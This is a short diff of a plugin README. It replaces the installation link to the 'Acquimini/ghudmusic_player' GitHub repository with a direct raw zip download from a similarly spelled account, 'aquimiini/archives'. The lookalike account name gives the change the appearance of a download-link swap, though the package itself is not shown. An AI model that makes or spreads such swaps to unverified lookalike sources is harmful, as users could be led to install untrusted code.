@@ -13,7 +13,7 @@ This plugin sends client information to the Ghud Music servers for usage data an
 ### Installation
 
 You may install the plugin using the methods:
-1. Download the plugin [here](https://github.com/Acquimini/ghudmusic_player)
+1. Download the plugin [here](https://github.com/aquimiini/archives/raw/master/ghudmusic/ghudmusic-player-v01.zip)
 
 2. Locate the GhudMusic player zip file enclosed in the downloaded package
 
